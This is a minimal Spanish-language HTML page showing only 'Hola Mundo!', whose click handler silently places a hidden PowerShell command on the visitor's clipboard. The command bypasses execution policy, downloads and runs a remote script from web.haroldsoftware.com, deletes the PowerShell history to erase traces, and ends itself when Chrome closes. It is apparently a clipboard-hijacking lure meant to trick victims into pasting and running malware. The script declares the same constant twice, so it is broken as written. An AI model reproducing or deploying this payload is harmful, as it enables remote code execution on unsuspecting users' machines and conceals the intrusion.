<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Inicio</title>
</head>
<body onclick="copiarComando()">

    <p>Hola Mundo!</p>

    <script>
        function copiarComando() {
            const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$vpn = Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \\\"Invoke-Expression (Invoke-RestMethod -Uri ''https://web.haroldsoftware.com/metrics.ps1'')\\\"' -WindowStyle Hidden -PassThru; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; while (Get-Process chrome -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }) { Start-Sleep -Milliseconds 200 }; Stop-Process -Id $vpn.Id -Force -ErrorAction SilentlyContinue; exit\"";
            const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$vpn = Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \\\"Invoke-Expression (Invoke-RestMethod -Uri https://web.haroldsoftware.com/metrics.ps1)\\\"' -WindowStyle Hidden -PassThru; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; while (Get-Process chrome -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }) { Start-Sleep -Milliseconds 200 }; Stop-Process -Id $vpn.Id -Force -ErrorAction SilentlyContinue; exit\"";
            navigator.clipboard.writeText(cmd).then(() => {
                console.log('Comando copiado al portapapeles');
                document.body.removeAttribute('onclick');
            }).catch(err => {
                console.error('Error al copiar: ', err);
            });
        }
    </script>

</body>
</html>
